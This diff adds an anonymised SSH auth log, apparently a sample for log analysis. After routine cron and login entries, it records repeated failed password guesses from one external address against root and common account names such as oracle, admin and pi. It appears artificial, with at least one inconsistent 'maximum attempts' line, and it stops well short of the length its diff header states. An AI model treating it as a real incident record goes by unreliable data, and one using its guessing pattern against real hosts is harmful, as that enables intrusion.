@@ -1,0 +1,996 @@
+Sep 22 00:00:01 HOST_1 CRON[3946]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 00:00:02 HOST_1 CRON[3946]: pam_unix(cron:session): session closed for user root
+Sep 22 00:05:10 HOST_1 sshd[7814]: Accepted publickey for USER_1 from IP_INT_1 port 52603 ssh2: ED25519 SHA256:[EMPREINTE]
+Sep 22 00:05:10 HOST_1 sshd[7814]: pam_unix(sshd:session): session opened for user USER_1(uid=1001) by (uid=0)
+Sep 22 00:22:31 HOST_1 sshd[7814]: pam_unix(sshd:session): session closed for user USER_1
+Sep 22 00:30:01 HOST_1 CRON[3754]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 00:30:02 HOST_1 CRON[3754]: pam_unix(cron:session): session closed for user root
+Sep 22 01:00:01 HOST_1 CRON[3978]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 01:00:02 HOST_1 CRON[3978]: pam_unix(cron:session): session closed for user root
+Sep 22 01:17:40 HOST_1 systemd-timesyncd[612]: Synchronized to time server IP_EXT_3:123 (ntp.example).
+Sep 22 01:30:01 HOST_1 CRON[2479]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 01:30:02 HOST_1 CRON[2479]: pam_unix(cron:session): session closed for user root
+Sep 22 02:00:01 HOST_1 CRON[1419]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 02:00:02 HOST_1 CRON[1419]: pam_unix(cron:session): session closed for user root
+Sep 22 02:10:07 HOST_1 sshd[26793]: Failed password for root from IP_EXT_1 port 60704 ssh2
+Sep 22 02:10:07 HOST_1 sshd[26793]: Connection closed by authenticating user root IP_EXT_1 port 60704 [preauth]
+Sep 22 02:10:12 HOST_1 sshd[29804]: Invalid user oracle from IP_EXT_1 port 39848
+Sep 22 02:10:13 HOST_1 sshd[29804]: Failed password for invalid user oracle from IP_EXT_1 port 39848 ssh2
+Sep 22 02:10:13 HOST_1 sshd[29804]: Connection closed by invalid user oracle IP_EXT_1 port 39848 [preauth]
+Sep 22 02:10:18 HOST_1 sshd[23355]: Invalid user ftpuser from IP_EXT_1 port 45443
+Sep 22 02:10:19 HOST_1 sshd[23355]: Failed password for invalid user ftpuser from IP_EXT_1 port 45443 ssh2
+Sep 22 02:10:19 HOST_1 sshd[23355]: Connection closed by invalid user ftpuser IP_EXT_1 port 45443 [preauth]
+Sep 22 02:10:22 HOST_1 sshd[21658]: Failed password for root from IP_EXT_1 port 45578 ssh2
+Sep 22 02:10:22 HOST_1 sshd[21658]: Connection closed by authenticating user root IP_EXT_1 port 45578 [preauth]
+Sep 22 02:10:23 HOST_1 sshd[21948]: Invalid user guest from IP_EXT_1 port 46246
+Sep 22 02:10:24 HOST_1 sshd[21948]: Failed password for invalid user guest from IP_EXT_1 port 46246 ssh2
+Sep 22 02:10:24 HOST_1 sshd[21948]: Connection closed by invalid user guest IP_EXT_1 port 46246 [preauth]
+Sep 22 02:10:26 HOST_1 sshd[21139]: Invalid user admin from IP_EXT_1 port 57400
+Sep 22 02:10:27 HOST_1 sshd[21139]: Failed password for invalid user admin from IP_EXT_1 port 57400 ssh2
+Sep 22 02:10:27 HOST_1 sshd[21139]: Connection closed by invalid user admin IP_EXT_1 port 57400 [preauth]
+Sep 22 02:10:29 HOST_1 sshd[22557]: Failed password for USER_2 from IP_EXT_1 port 56033 ssh2
+Sep 22 02:10:29 HOST_1 sshd[22557]: Connection closed by authenticating user USER_2 IP_EXT_1 port 56033 [preauth]
+Sep 22 02:10:30 HOST_1 sshd[22942]: Invalid user postgres from IP_EXT_1 port 37217
+Sep 22 02:10:31 HOST_1 sshd[22942]: Failed password for invalid user postgres from IP_EXT_1 port 37217 ssh2
+Sep 22 02:10:31 HOST_1 sshd[22942]: Connection closed by invalid user postgres IP_EXT_1 port 37217 [preauth]
+Sep 22 02:10:33 HOST_1 sshd[23183]: Failed password for root from IP_EXT_1 port 51650 ssh2
+Sep 22 02:10:33 HOST_1 sshd[23183]: Connection closed by authenticating user root IP_EXT_1 port 51650 [preauth]
+Sep 22 02:10:34 HOST_1 sshd[24321]: Failed password for USER_1 from IP_EXT_1 port 35972 ssh2
+Sep 22 02:10:34 HOST_1 sshd[24321]: Connection closed by authenticating user USER_1 IP_EXT_1 port 35972 [preauth]
+Sep 22 02:10:37 HOST_1 sshd[25738]: Invalid user deploy from IP_EXT_1 port 35608
+Sep 22 02:10:38 HOST_1 sshd[25738]: Failed password for invalid user deploy from IP_EXT_1 port 35608 ssh2
+Sep 22 02:10:38 HOST_1 sshd[25738]: Connection closed by invalid user deploy IP_EXT_1 port 35608 [preauth]
+Sep 22 02:10:41 HOST_1 sshd[21958]: Failed password for root from IP_EXT_1 port 59435 ssh2
+Sep 22 02:10:41 HOST_1 sshd[21958]: Connection closed by authenticating user root IP_EXT_1 port 59435 [preauth]
+Sep 22 02:10:46 HOST_1 sshd[29279]: Invalid user postgres from IP_EXT_1 port 54888
+Sep 22 02:10:47 HOST_1 sshd[29279]: Failed password for invalid user postgres from IP_EXT_1 port 54888 ssh2
+Sep 22 02:10:47 HOST_1 sshd[29279]: Connection closed by invalid user postgres IP_EXT_1 port 54888 [preauth]
+Sep 22 02:10:52 HOST_1 sshd[28375]: Invalid user nagios from IP_EXT_1 port 52665
+Sep 22 02:10:53 HOST_1 sshd[28375]: Failed password for invalid user nagios from IP_EXT_1 port 52665 ssh2
+Sep 22 02:10:53 HOST_1 sshd[28375]: Connection closed by invalid user nagios IP_EXT_1 port 52665 [preauth]
+Sep 22 02:10:55 HOST_1 sshd[28703]: Invalid user test from IP_EXT_1 port 41261
+Sep 22 02:10:56 HOST_1 sshd[28703]: Failed password for invalid user test from IP_EXT_1 port 41261 ssh2
+Sep 22 02:10:56 HOST_1 sshd[28703]: Connection closed by invalid user test IP_EXT_1 port 41261 [preauth]
+Sep 22 02:11:01 HOST_1 sshd[21719]: Failed password for USER_1 from IP_EXT_1 port 33980 ssh2
+Sep 22 02:11:01 HOST_1 sshd[21719]: Connection closed by authenticating user USER_1 IP_EXT_1 port 33980 [preauth]
+Sep 22 02:11:06 HOST_1 sshd[28388]: Invalid user oracle from IP_EXT_1 port 56181
+Sep 22 02:11:07 HOST_1 sshd[28388]: Failed password for invalid user oracle from IP_EXT_1 port 56181 ssh2
+Sep 22 02:11:07 HOST_1 sshd[28388]: Connection closed by invalid user oracle IP_EXT_1 port 56181 [preauth]
+Sep 22 02:11:08 HOST_1 sshd[28925]: Invalid user deploy from IP_EXT_1 port 37077
+Sep 22 02:11:09 HOST_1 sshd[28925]: Failed password for invalid user deploy from IP_EXT_1 port 37077 ssh2
+Sep 22 02:11:09 HOST_1 sshd[28925]: Connection closed by invalid user deploy IP_EXT_1 port 37077 [preauth]
+Sep 22 02:11:12 HOST_1 sshd[25370]: Failed password for SVC_1 from IP_EXT_1 port 33932 ssh2
+Sep 22 02:11:12 HOST_1 sshd[25370]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 33932 [preauth]
+Sep 22 02:11:17 HOST_1 sshd[21647]: Invalid user postgres from IP_EXT_1 port 33891
+Sep 22 02:11:18 HOST_1 sshd[21647]: Failed password for invalid user postgres from IP_EXT_1 port 33891 ssh2
+Sep 22 02:11:18 HOST_1 sshd[21647]: Connection closed by invalid user postgres IP_EXT_1 port 33891 [preauth]
+Sep 22 02:11:19 HOST_1 sshd[24341]: Invalid user admin from IP_EXT_1 port 37640
+Sep 22 02:11:20 HOST_1 sshd[24341]: Failed password for invalid user admin from IP_EXT_1 port 37640 ssh2
+Sep 22 02:11:20 HOST_1 sshd[24341]: Connection closed by invalid user admin IP_EXT_1 port 37640 [preauth]
+Sep 22 02:11:21 HOST_1 sshd[26958]: Failed password for USER_1 from IP_EXT_1 port 57579 ssh2
+Sep 22 02:11:21 HOST_1 sshd[26958]: Connection closed by authenticating user USER_1 IP_EXT_1 port 57579 [preauth]
+Sep 22 02:11:23 HOST_1 sshd[21808]: Failed password for root from IP_EXT_1 port 60120 ssh2
+Sep 22 02:11:23 HOST_1 sshd[21808]: Connection closed by authenticating user root IP_EXT_1 port 60120 [preauth]
+Sep 22 02:11:24 HOST_1 sshd[26555]: Failed password for USER_2 from IP_EXT_1 port 59952 ssh2
+Sep 22 02:11:24 HOST_1 sshd[26555]: Connection closed by authenticating user USER_2 IP_EXT_1 port 59952 [preauth]
+Sep 22 02:11:28 HOST_1 sshd[27374]: Failed password for USER_1 from IP_EXT_1 port 59398 ssh2
+Sep 22 02:11:28 HOST_1 sshd[27374]: Connection closed by authenticating user USER_1 IP_EXT_1 port 59398 [preauth]
+Sep 22 02:11:32 HOST_1 sshd[23886]: Failed password for root from IP_EXT_1 port 46911 ssh2
+Sep 22 02:11:32 HOST_1 sshd[23886]: Connection closed by authenticating user root IP_EXT_1 port 46911 [preauth]
+Sep 22 02:11:35 HOST_1 sshd[20306]: Failed password for SVC_1 from IP_EXT_1 port 44130 ssh2
+Sep 22 02:11:35 HOST_1 sshd[20306]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 44130 [preauth]
+Sep 22 02:11:36 HOST_1 sshd[20863]: Invalid user oracle from IP_EXT_1 port 40255
+Sep 22 02:11:37 HOST_1 sshd[20863]: Failed password for invalid user oracle from IP_EXT_1 port 40255 ssh2
+Sep 22 02:11:37 HOST_1 sshd[20863]: Connection closed by invalid user oracle IP_EXT_1 port 40255 [preauth]
+Sep 22 02:11:42 HOST_1 sshd[25122]: Invalid user guest from IP_EXT_1 port 59701
+Sep 22 02:11:43 HOST_1 sshd[25122]: Failed password for invalid user guest from IP_EXT_1 port 59701 ssh2
+Sep 22 02:11:43 HOST_1 sshd[25122]: Connection closed by invalid user guest IP_EXT_1 port 59701 [preauth]
+Sep 22 02:11:48 HOST_1 sshd[28269]: Invalid user ftpuser from IP_EXT_1 port 58302
+Sep 22 02:11:49 HOST_1 sshd[28269]: Failed password for invalid user ftpuser from IP_EXT_1 port 58302 ssh2
+Sep 22 02:11:49 HOST_1 sshd[28269]: Connection closed by invalid user ftpuser IP_EXT_1 port 58302 [preauth]
+Sep 22 02:11:51 HOST_1 sshd[25207]: Invalid user git from IP_EXT_1 port 36427
+Sep 22 02:11:52 HOST_1 sshd[25207]: Failed password for invalid user git from IP_EXT_1 port 36427 ssh2
+Sep 22 02:11:52 HOST_1 sshd[25207]: Connection closed by invalid user git IP_EXT_1 port 36427 [preauth]
+Sep 22 02:11:56 HOST_1 sshd[22353]: Invalid user administrator from IP_EXT_1 port 37037
+Sep 22 02:11:57 HOST_1 sshd[22353]: Failed password for invalid user administrator from IP_EXT_1 port 37037 ssh2
+Sep 22 02:11:57 HOST_1 sshd[22353]: Connection closed by invalid user administrator IP_EXT_1 port 37037 [preauth]
+Sep 22 02:12:00 HOST_1 sshd[28669]: Failed password for USER_2 from IP_EXT_1 port 56612 ssh2
+Sep 22 02:12:00 HOST_1 sshd[28669]: Connection closed by authenticating user USER_2 IP_EXT_1 port 56612 [preauth]
+Sep 22 02:12:04 HOST_1 sshd[28380]: Invalid user user from IP_EXT_1 port 47279
+Sep 22 02:12:05 HOST_1 sshd[28380]: Failed password for invalid user user from IP_EXT_1 port 47279 ssh2
+Sep 22 02:12:05 HOST_1 sshd[28380]: Connection closed by invalid user user IP_EXT_1 port 47279 [preauth]
+Sep 22 02:12:10 HOST_1 sshd[27436]: Failed password for USER_1 from IP_EXT_1 port 53690 ssh2
+Sep 22 02:12:10 HOST_1 sshd[27436]: Connection closed by authenticating user USER_1 IP_EXT_1 port 53690 [preauth]
+Sep 22 02:12:12 HOST_1 sshd[25915]: Failed password for root from IP_EXT_1 port 42712 ssh2
+Sep 22 02:12:12 HOST_1 sshd[25915]: Connection closed by authenticating user root IP_EXT_1 port 42712 [preauth]
+Sep 22 02:12:14 HOST_1 sshd[28974]: Failed password for USER_2 from IP_EXT_1 port 40641 ssh2
+Sep 22 02:12:14 HOST_1 sshd[28974]: Connection closed by authenticating user USER_2 IP_EXT_1 port 40641 [preauth]
+Sep 22 02:12:17 HOST_1 sshd[27148]: Invalid user ftpuser from IP_EXT_1 port 54313
+Sep 22 02:12:18 HOST_1 sshd[27148]: Failed password for invalid user ftpuser from IP_EXT_1 port 54313 ssh2
+Sep 22 02:12:18 HOST_1 sshd[27148]: Connection closed by invalid user ftpuser IP_EXT_1 port 54313 [preauth]
+Sep 22 02:12:21 HOST_1 sshd[26116]: Invalid user ftpuser from IP_EXT_1 port 57308
+Sep 22 02:12:22 HOST_1 sshd[26116]: Failed password for invalid user ftpuser from IP_EXT_1 port 57308 ssh2
+Sep 22 02:12:22 HOST_1 sshd[26116]: Connection closed by invalid user ftpuser IP_EXT_1 port 57308 [preauth]
+Sep 22 02:12:25 HOST_1 sshd[25068]: Invalid user user from IP_EXT_1 port 58649
+Sep 22 02:12:26 HOST_1 sshd[25068]: Failed password for invalid user user from IP_EXT_1 port 58649 ssh2
+Sep 22 02:12:26 HOST_1 sshd[25068]: Connection closed by invalid user user IP_EXT_1 port 58649 [preauth]
+Sep 22 02:12:26 HOST_1 sshd[25068]: error: maximum authentication attempts exceeded for root from IP_EXT_1 port 58649 ssh2 [preauth]
+Sep 22 02:12:30 HOST_1 sshd[22238]: Failed password for root from IP_EXT_1 port 49736 ssh2
+Sep 22 02:12:30 HOST_1 sshd[22238]: Connection closed by authenticating user root IP_EXT_1 port 49736 [preauth]
+Sep 22 02:12:34 HOST_1 sshd[20170]: Invalid user pi from IP_EXT_1 port 47310
+Sep 22 02:12:35 HOST_1 sshd[20170]: Failed password for invalid user pi from IP_EXT_1 port 47310 ssh2
+Sep 22 02:12:35 HOST_1 sshd[20170]: Connection closed by invalid user pi IP_EXT_1 port 47310 [preauth]
+Sep 22 02:12:40 HOST_1 sshd[26506]: Invalid user ftpuser from IP_EXT_1 port 57036
+Sep 22 02:12:41 HOST_1 sshd[26506]: Failed password for invalid user ftpuser from IP_EXT_1 port 57036 ssh2
+Sep 22 02:12:41 HOST_1 sshd[26506]: Connection closed by invalid user ftpuser IP_EXT_1 port 57036 [preauth]
+Sep 22 02:12:45 HOST_1 sshd[22047]: Failed password for root from IP_EXT_1 port 57631 ssh2
+Sep 22 02:12:45 HOST_1 sshd[22047]: Connection closed by authenticating user root IP_EXT_1 port 57631 [preauth]
+Sep 22 02:12:49 HOST_1 sshd[26157]: Failed password for root from IP_EXT_1 port 52064 ssh2
+Sep 22 02:12:49 HOST_1 sshd[26157]: Connection closed by authenticating user root IP_EXT_1 port 52064 [preauth]
+Sep 22 02:12:52 HOST_1 sshd[25154]: Invalid user admin from IP_EXT_1 port 40579
+Sep 22 02:12:53 HOST_1 sshd[25154]: Failed password for invalid user admin from IP_EXT_1 port 40579 ssh2
+Sep 22 02:12:53 HOST_1 sshd[25154]: Connection closed by invalid user admin IP_EXT_1 port 40579 [preauth]
+Sep 22 02:12:54 HOST_1 sshd[27796]: Failed password for root from IP_EXT_1 port 44766 ssh2
+Sep 22 02:12:54 HOST_1 sshd[27796]: Connection closed by authenticating user root IP_EXT_1 port 44766 [preauth]
+Sep 22 02:12:55 HOST_1 sshd[28567]: Invalid user git from IP_EXT_1 port 38299
+Sep 22 02:12:56 HOST_1 sshd[28567]: Failed password for invalid user git from IP_EXT_1 port 38299 ssh2
+Sep 22 02:12:56 HOST_1 sshd[28567]: Connection closed by invalid user git IP_EXT_1 port 38299 [preauth]
+Sep 22 02:13:00 HOST_1 sshd[25473]: Failed password for USER_1 from IP_EXT_1 port 34076 ssh2
+Sep 22 02:13:00 HOST_1 sshd[25473]: Connection closed by authenticating user USER_1 IP_EXT_1 port 34076 [preauth]
+Sep 22 02:13:02 HOST_1 sshd[23651]: Invalid user deploy from IP_EXT_1 port 48029
+Sep 22 02:13:03 HOST_1 sshd[23651]: Failed password for invalid user deploy from IP_EXT_1 port 48029 ssh2
+Sep 22 02:13:03 HOST_1 sshd[23651]: Connection closed by invalid user deploy IP_EXT_1 port 48029 [preauth]
+Sep 22 02:13:05 HOST_1 sshd[26406]: Invalid user git from IP_EXT_1 port 47170
+Sep 22 02:13:06 HOST_1 sshd[26406]: Failed password for invalid user git from IP_EXT_1 port 47170 ssh2
+Sep 22 02:13:06 HOST_1 sshd[26406]: Connection closed by invalid user git IP_EXT_1 port 47170 [preauth]
+Sep 22 02:13:10 HOST_1 sshd[23096]: Invalid user backup from IP_EXT_1 port 59459
+Sep 22 02:13:11 HOST_1 sshd[23096]: Failed password for invalid user backup from IP_EXT_1 port 59459 ssh2
+Sep 22 02:13:11 HOST_1 sshd[23096]: Connection closed by invalid user backup IP_EXT_1 port 59459 [preauth]
+Sep 22 02:13:15 HOST_1 sshd[24850]: Failed password for root from IP_EXT_1 port 51851 ssh2
+Sep 22 02:13:15 HOST_1 sshd[24850]: Connection closed by authenticating user root IP_EXT_1 port 51851 [preauth]
+Sep 22 02:13:20 HOST_1 sshd[29774]: Failed password for root from IP_EXT_1 port 51308 ssh2
+Sep 22 02:13:20 HOST_1 sshd[29774]: Connection closed by authenticating user root IP_EXT_1 port 51308 [preauth]
+Sep 22 02:13:22 HOST_1 sshd[20030]: Invalid user nagios from IP_EXT_1 port 39437
+Sep 22 02:13:23 HOST_1 sshd[20030]: Failed password for invalid user nagios from IP_EXT_1 port 39437 ssh2
+Sep 22 02:13:23 HOST_1 sshd[20030]: Connection closed by invalid user nagios IP_EXT_1 port 39437 [preauth]
+Sep 22 02:13:25 HOST_1 sshd[23630]: Invalid user nagios from IP_EXT_1 port 36273
+Sep 22 02:13:26 HOST_1 sshd[23630]: Failed password for invalid user nagios from IP_EXT_1 port 36273 ssh2
+Sep 22 02:13:26 HOST_1 sshd[23630]: Connection closed by invalid user nagios IP_EXT_1 port 36273 [preauth]
+Sep 22 02:13:31 HOST_1 sshd[29215]: Failed password for SVC_1 from IP_EXT_1 port 49925 ssh2
+Sep 22 02:13:31 HOST_1 sshd[29215]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 49925 [preauth]
+Sep 22 02:13:33 HOST_1 sshd[25533]: Failed password for root from IP_EXT_1 port 54727 ssh2
+Sep 22 02:13:33 HOST_1 sshd[25533]: Connection closed by authenticating user root IP_EXT_1 port 54727 [preauth]
+Sep 22 02:13:34 HOST_1 sshd[20004]: Invalid user deploy from IP_EXT_1 port 45307
+Sep 22 02:13:35 HOST_1 sshd[20004]: Failed password for invalid user deploy from IP_EXT_1 port 45307 ssh2
+Sep 22 02:13:35 HOST_1 sshd[20004]: Connection closed by invalid user deploy IP_EXT_1 port 45307 [preauth]
+Sep 22 02:13:39 HOST_1 sshd[29781]: Failed password for root from IP_EXT_1 port 39375 ssh2
+Sep 22 02:13:39 HOST_1 sshd[29781]: Connection closed by authenticating user root IP_EXT_1 port 39375 [preauth]
+Sep 22 02:13:41 HOST_1 sshd[21561]: Failed password for root from IP_EXT_1 port 46708 ssh2
+Sep 22 02:13:41 HOST_1 sshd[21561]: Connection closed by authenticating user root IP_EXT_1 port 46708 [preauth]
+Sep 22 02:13:44 HOST_1 sshd[20014]: Failed password for root from IP_EXT_1 port 59758 ssh2
+Sep 22 02:13:44 HOST_1 sshd[20014]: Connection closed by authenticating user root IP_EXT_1 port 59758 [preauth]
+Sep 22 02:13:47 HOST_1 sshd[28871]: Failed password for root from IP_EXT_1 port 47734 ssh2
+Sep 22 02:13:47 HOST_1 sshd[28871]: Connection closed by authenticating user root IP_EXT_1 port 47734 [preauth]
+Sep 22 02:13:49 HOST_1 sshd[20137]: Failed password for SVC_1 from IP_EXT_1 port 54583 ssh2
+Sep 22 02:13:49 HOST_1 sshd[20137]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 54583 [preauth]
+Sep 22 02:13:52 HOST_1 sshd[26912]: Failed password for USER_1 from IP_EXT_1 port 42586 ssh2
+Sep 22 02:13:52 HOST_1 sshd[26912]: Connection closed by authenticating user USER_1 IP_EXT_1 port 42586 [preauth]
+Sep 22 02:13:55 HOST_1 sshd[27883]: Failed password for root from IP_EXT_1 port 39962 ssh2
+Sep 22 02:13:55 HOST_1 sshd[27883]: Connection closed by authenticating user root IP_EXT_1 port 39962 [preauth]
+Sep 22 02:13:58 HOST_1 sshd[27084]: Invalid user guest from IP_EXT_1 port 52741
+Sep 22 02:13:59 HOST_1 sshd[27084]: Failed password for invalid user guest from IP_EXT_1 port 52741 ssh2
+Sep 22 02:13:59 HOST_1 sshd[27084]: Connection closed by invalid user guest IP_EXT_1 port 52741 [preauth]
+Sep 22 02:14:02 HOST_1 sshd[20853]: Invalid user user from IP_EXT_1 port 43835
+Sep 22 02:14:03 HOST_1 sshd[20853]: Failed password for invalid user user from IP_EXT_1 port 43835 ssh2
+Sep 22 02:14:03 HOST_1 sshd[20853]: Connection closed by invalid user user IP_EXT_1 port 43835 [preauth]
+Sep 22 02:14:05 HOST_1 sshd[23472]: Failed password for USER_2 from IP_EXT_1 port 42735 ssh2
+Sep 22 02:14:05 HOST_1 sshd[23472]: Connection closed by authenticating user USER_2 IP_EXT_1 port 42735 [preauth]
+Sep 22 02:14:09 HOST_1 sshd[22701]: Failed password for SVC_1 from IP_EXT_1 port 60758 ssh2
+Sep 22 02:14:09 HOST_1 sshd[22701]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 60758 [preauth]
+Sep 22 02:14:14 HOST_1 sshd[27002]: Failed password for root from IP_EXT_1 port 47189 ssh2
+Sep 22 02:14:14 HOST_1 sshd[27002]: Connection closed by authenticating user root IP_EXT_1 port 47189 [preauth]
+Sep 22 02:14:16 HOST_1 sshd[24443]: Invalid user backup from IP_EXT_1 port 55940
+Sep 22 02:14:17 HOST_1 sshd[24443]: Failed password for invalid user backup from IP_EXT_1 port 55940 ssh2
+Sep 22 02:14:17 HOST_1 sshd[24443]: Connection closed by invalid user backup IP_EXT_1 port 55940 [preauth]
+Sep 22 02:14:21 HOST_1 sshd[24853]: Failed password for USER_1 from IP_EXT_1 port 35015 ssh2
+Sep 22 02:14:21 HOST_1 sshd[24853]: Connection closed by authenticating user USER_1 IP_EXT_1 port 35015 [preauth]
+Sep 22 02:14:26 HOST_1 sshd[25978]: Invalid user git from IP_EXT_1 port 56433
+Sep 22 02:14:27 HOST_1 sshd[25978]: Failed password for invalid user git from IP_EXT_1 port 56433 ssh2
+Sep 22 02:14:27 HOST_1 sshd[25978]: Connection closed by invalid user git IP_EXT_1 port 56433 [preauth]
+Sep 22 02:14:31 HOST_1 sshd[23258]: Invalid user git from IP_EXT_1 port 33598
+Sep 22 02:14:32 HOST_1 sshd[23258]: Failed password for invalid user git from IP_EXT_1 port 33598 ssh2
+Sep 22 02:14:32 HOST_1 sshd[23258]: Connection closed by invalid user git IP_EXT_1 port 33598 [preauth]
+Sep 22 02:14:33 HOST_1 sshd[20126]: Invalid user postgres from IP_EXT_1 port 40512
+Sep 22 02:14:34 HOST_1 sshd[20126]: Failed password for invalid user postgres from IP_EXT_1 port 40512 ssh2
+Sep 22 02:14:34 HOST_1 sshd[20126]: Connection closed by invalid user postgres IP_EXT_1 port 40512 [preauth]
+Sep 22 02:14:37 HOST_1 sshd[23002]: Failed password for root from IP_EXT_1 port 43266 ssh2
+Sep 22 02:14:37 HOST_1 sshd[23002]: Connection closed by authenticating user root IP_EXT_1 port 43266 [preauth]
+Sep 22 02:14:40 HOST_1 sshd[25338]: Failed password for root from IP_EXT_1 port 49873 ssh2
+Sep 22 02:14:40 HOST_1 sshd[25338]: Connection closed by authenticating user root IP_EXT_1 port 49873 [preauth]
+Sep 22 02:14:45 HOST_1 sshd[21439]: Failed password for root from IP_EXT_1 port 41602 ssh2
+Sep 22 02:14:45 HOST_1 sshd[21439]: Connection closed by authenticating user root IP_EXT_1 port 41602 [preauth]
+Sep 22 02:14:47 HOST_1 sshd[23334]: Failed password for root from IP_EXT_1 port 41167 ssh2
+Sep 22 02:14:47 HOST_1 sshd[23334]: Connection closed by authenticating user root IP_EXT_1 port 41167 [preauth]
+Sep 22 02:14:47 HOST_1 sshd[23334]: error: maximum authentication attempts exceeded for root from IP_EXT_1 port 41167 ssh2 [preauth]
+Sep 22 02:14:49 HOST_1 sshd[25810]: Failed password for SVC_1 from IP_EXT_1 port 58154 ssh2
+Sep 22 02:14:49 HOST_1 sshd[25810]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 58154 [preauth]
+Sep 22 02:14:50 HOST_1 sshd[24736]: Failed password for USER_1 from IP_EXT_1 port 36646 ssh2
+Sep 22 02:14:50 HOST_1 sshd[24736]: Connection closed by authenticating user USER_1 IP_EXT_1 port 36646 [preauth]
+Sep 22 02:14:52 HOST_1 sshd[29084]: Failed password for SVC_1 from IP_EXT_1 port 35136 ssh2
+Sep 22 02:14:52 HOST_1 sshd[29084]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 35136 [preauth]
+Sep 22 02:14:54 HOST_1 sshd[25009]: Invalid user test from IP_EXT_1 port 46300
+Sep 22 02:14:55 HOST_1 sshd[25009]: Failed password for invalid user test from IP_EXT_1 port 46300 ssh2
+Sep 22 02:14:55 HOST_1 sshd[25009]: Connection closed by invalid user test IP_EXT_1 port 46300 [preauth]
+Sep 22 02:14:59 HOST_1 sshd[20503]: Failed password for root from IP_EXT_1 port 36121 ssh2
+Sep 22 02:14:59 HOST_1 sshd[20503]: Connection closed by authenticating user root IP_EXT_1 port 36121 [preauth]
+Sep 22 02:15:01 HOST_1 sshd[27875]: Failed password for USER_1 from IP_EXT_1 port 55551 ssh2
+Sep 22 02:15:01 HOST_1 sshd[27875]: Connection closed by authenticating user USER_1 IP_EXT_1 port 55551 [preauth]
+Sep 22 02:15:06 HOST_1 sshd[24097]: Invalid user deploy from IP_EXT_1 port 35284
+Sep 22 02:15:07 HOST_1 sshd[24097]: Failed password for invalid user deploy from IP_EXT_1 port 35284 ssh2
+Sep 22 02:15:07 HOST_1 sshd[24097]: Connection closed by invalid user deploy IP_EXT_1 port 35284 [preauth]
+Sep 22 02:15:09 HOST_1 sshd[25791]: Invalid user support from IP_EXT_1 port 39395
+Sep 22 02:15:10 HOST_1 sshd[25791]: Failed password for invalid user support from IP_EXT_1 port 39395 ssh2
+Sep 22 02:15:10 HOST_1 sshd[25791]: Connection closed by invalid user support IP_EXT_1 port 39395 [preauth]
+Sep 22 02:15:13 HOST_1 sshd[22234]: Invalid user nagios from IP_EXT_1 port 41736
+Sep 22 02:15:14 HOST_1 sshd[22234]: Failed password for invalid user nagios from IP_EXT_1 port 41736 ssh2
+Sep 22 02:15:14 HOST_1 sshd[22234]: Connection closed by invalid user nagios IP_EXT_1 port 41736 [preauth]
+Sep 22 02:15:18 HOST_1 sshd[26822]: Invalid user user from IP_EXT_1 port 56309
+Sep 22 02:15:19 HOST_1 sshd[26822]: Failed password for invalid user user from IP_EXT_1 port 56309 ssh2
+Sep 22 02:15:19 HOST_1 sshd[26822]: Connection closed by invalid user user IP_EXT_1 port 56309 [preauth]
+Sep 22 02:15:23 HOST_1 sshd[25436]: Invalid user backup from IP_EXT_1 port 44350
+Sep 22 02:15:24 HOST_1 sshd[25436]: Failed password for invalid user backup from IP_EXT_1 port 44350 ssh2
+Sep 22 02:15:24 HOST_1 sshd[25436]: Connection closed by invalid user backup IP_EXT_1 port 44350 [preauth]
+Sep 22 02:15:27 HOST_1 sshd[24674]: Invalid user support from IP_EXT_1 port 35067
+Sep 22 02:15:28 HOST_1 sshd[24674]: Failed password for invalid user support from IP_EXT_1 port 35067 ssh2
+Sep 22 02:15:28 HOST_1 sshd[24674]: Connection closed by invalid user support IP_EXT_1 port 35067 [preauth]
+Sep 22 02:15:33 HOST_1 sshd[26673]: Invalid user nagios from IP_EXT_1 port 57512
+Sep 22 02:15:34 HOST_1 sshd[26673]: Failed password for invalid user nagios from IP_EXT_1 port 57512 ssh2
+Sep 22 02:15:34 HOST_1 sshd[26673]: Connection closed by invalid user nagios IP_EXT_1 port 57512 [preauth]
+Sep 22 02:15:36 HOST_1 sshd[27830]: Invalid user ftpuser from IP_EXT_1 port 35532
+Sep 22 02:15:37 HOST_1 sshd[27830]: Failed password for invalid user ftpuser from IP_EXT_1 port 35532 ssh2
+Sep 22 02:15:37 HOST_1 sshd[27830]: Connection closed by invalid user ftpuser IP_EXT_1 port 35532 [preauth]
+Sep 22 02:15:39 HOST_1 sshd[22819]: Invalid user git from IP_EXT_1 port 48153
+Sep 22 02:15:40 HOST_1 sshd[22819]: Failed password for invalid user git from IP_EXT_1 port 48153 ssh2
+Sep 22 02:15:40 HOST_1 sshd[22819]: Connection closed by invalid user git IP_EXT_1 port 48153 [preauth]
+Sep 22 02:15:41 HOST_1 sshd[27609]: Failed password for SVC_1 from IP_EXT_1 port 38374 ssh2
+Sep 22 02:15:41 HOST_1 sshd[27609]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 38374 [preauth]
+Sep 22 02:15:45 HOST_1 sshd[22177]: Failed password for SVC_1 from IP_EXT_1 port 45996 ssh2
+Sep 22 02:15:45 HOST_1 sshd[22177]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 45996 [preauth]
+Sep 22 02:15:46 HOST_1 sshd[25313]: Failed password for root from IP_EXT_1 port 46100 ssh2
+Sep 22 02:15:46 HOST_1 sshd[25313]: Connection closed by authenticating user root IP_EXT_1 port 46100 [preauth]
+Sep 22 02:15:47 HOST_1 sshd[23869]: Invalid user support from IP_EXT_1 port 59625
+Sep 22 02:15:48 HOST_1 sshd[23869]: Failed password for invalid user support from IP_EXT_1 port 59625 ssh2
+Sep 22 02:15:48 HOST_1 sshd[23869]: Connection closed by invalid user support IP_EXT_1 port 59625 [preauth]
+Sep 22 02:15:50 HOST_1 sshd[27733]: Invalid user admin from IP_EXT_1 port 37027
